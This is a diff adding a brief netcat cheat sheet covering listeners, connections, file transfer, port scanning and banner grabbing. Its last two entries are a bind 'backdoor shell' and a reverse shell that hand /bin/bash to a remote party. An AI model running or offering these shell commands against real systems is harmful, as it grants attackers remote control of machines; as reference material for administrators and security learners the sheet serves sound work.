@@ -1,0 +1,21 @@
+
+# Start a Listener
+netcat -l -p <local_port>
+
+# Connect
+netcat <address> <port>
+
+# File transfer
+netcat -w3 <address> <port> < file.txt
+
+# Port scanner
+netcat -v -n -z -w1 <address> <start_port>-<end_port>
+
+# Grab TCP Banners
+echo "" | netcat -v -n -w1 <address> <start_port>-<end_port>
+
+# Backdoor shell
+netcat -l -p <local_port> -e /bin/bash
+
+# Reverse shell
+netcat <address> <port> -e /bin/bash
